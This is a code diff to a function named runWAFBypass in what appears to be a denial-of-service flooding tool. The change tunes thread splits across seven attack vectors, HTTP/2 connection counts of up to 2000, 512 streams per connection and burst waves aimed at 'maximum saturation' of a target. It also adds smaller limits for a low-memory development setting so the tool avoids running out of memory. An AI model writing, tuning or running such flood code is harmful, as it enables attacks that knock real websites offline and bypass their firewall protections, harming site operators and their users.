@@ -2028,19 +2028,25 @@ async function runWAFBypass(
   })();
 
   // ── Thread budget — 7-vector split ──────────────────────────────────────
+  // Dev (64MB worker heap, 1 worker): use conservative multipliers to avoid OOM.
+  // Deployed (1024MB worker, N workers): full multipliers for maximum saturation.
   const primaryT  = Math.max(1, Math.floor(threads * 0.30));
   const subresT   = Math.max(1, Math.floor(threads * 0.25));
   const cacheT    = Math.max(1, Math.floor(threads * 0.18));
   const sessionT  = Math.max(1, Math.floor(threads * 0.14));
   const drainT    = Math.max(1, Math.floor(threads * 0.08));
-  // Vector V (origin direct) uses primary slots once origin found
 
-  const NUM_PRIMARY = Math.min(primaryT * 6, 2000);  // ★ +33% more primary H2 connections
-  const NUM_SUBRES  = Math.min(subresT  * 5, 1500);  // ★ +25% subresource connections
-  const NUM_CACHE   = Math.min(cacheT   * 4, 900);
-  const NUM_SESSION = Math.min(sessionT * 3, 600);
-  const NUM_DRAIN   = Math.min(drainT   * 4, 400);
-  const STREAMS_PER = Math.min(512, Math.max(64, primaryT * 3)); // ★ 512 streams/conn (was 256)
+  // Per-worker concurrent connection caps:
+  //   Dev: capped at 50/40/30/20/20 — fits comfortably in 64MB
+  //   Deployed: full multipliers (2000/1500/900/600/400)
+  const NUM_PRIMARY = IS_DEPLOYED ? Math.min(primaryT * 6, 2000) : Math.min(primaryT * 2, 50);
+  const NUM_SUBRES  = IS_DEPLOYED ? Math.min(subresT  * 5, 1500) : Math.min(subresT  * 2, 40);
+  const NUM_CACHE   = IS_DEPLOYED ? Math.min(cacheT   * 4,  900) : Math.min(cacheT   * 2, 30);
+  const NUM_SESSION = IS_DEPLOYED ? Math.min(sessionT * 3,  600) : Math.min(sessionT * 2, 20);
+  const NUM_DRAIN   = IS_DEPLOYED ? Math.min(drainT   * 4,  400) : Math.min(drainT   * 2, 20);
+  const STREAMS_PER = IS_DEPLOYED
+    ? Math.min(512, Math.max(64, primaryT * 3))
+    : Math.min(64,  Math.max(16, primaryT));
 
   let localPkts = 0, localBytes = 0;
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
@@ -2384,7 +2390,10 @@ async function runWAFBypass(
         ? (AbortSignal as unknown as { any(s: AbortSignal[]): AbortSignal }).any([signal, bAbort.signal])
         : bAbort.signal;
       const slots: Promise<void>[] = [];
-      const n = wave % 3 === 0 ? 80 : wave % 2 === 0 ? 55 : 45;
+      // Dev: scale burst down to avoid OOM (64MB heap); Deployed: full burst
+      const n = IS_DEPLOYED
+        ? (wave % 3 === 0 ? 80 : wave % 2 === 0 ? 55 : 45)
+        : (wave % 3 === 0 ? 10 : wave % 2 === 0 ?  8 :  6);
       if (wave % 3 === 0) {
         // MAX: all vectors at 2× — every 3rd wave
         for (let i = 0; i < n;                    i++) slots.push(runPrimarySlot(target, bSig));
